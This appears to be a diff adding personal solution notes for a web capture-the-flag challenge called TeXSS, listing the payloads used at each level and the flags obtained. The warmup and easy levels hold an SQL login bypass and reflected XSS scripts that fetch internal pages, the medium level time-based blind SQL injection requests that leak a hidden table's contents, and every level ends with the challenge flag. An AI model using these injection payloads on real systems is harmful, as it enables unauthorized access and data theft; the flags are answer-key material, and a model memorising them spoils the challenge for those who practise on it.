@@ -1,0 +1,16 @@
+Warmup level 
+	anonymous' OR '1'='1
+	flag: TeXSS{Head_For_The_Easy_Level_Now}
+	
+EasyLevel
+	?message=<script>alert(1)</script>
+	?message=<script>fetch('/internal.php').then(()=>fetch('/flag.php')).then(r=>r.text()).then(alert)</script>
+	flag: TeXSS{Reflected_XSS_Chained_Successfully}
+
+MediumLevel
+	GET /challenge.php?id=1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a)--+- HTTP/1.1
+	GET /challenge.php?id=1'+AND+(SELECT+IF(BINARY+SUBSTRING((SELECT+flag_part+FROM+members_hidden+LIMIT+1),1,1)='T',SLEEP(5),0))--+- HTTP/1.1
+	flag: TEXSS{T1M3_IS_TH3_ULT1M4T3_K3Y}
+
+HardLevel
+	flag: TeXSS{JWT_SSRF_XXE_PHP_Ev4l_Ch41n_3xpl01t3d!}
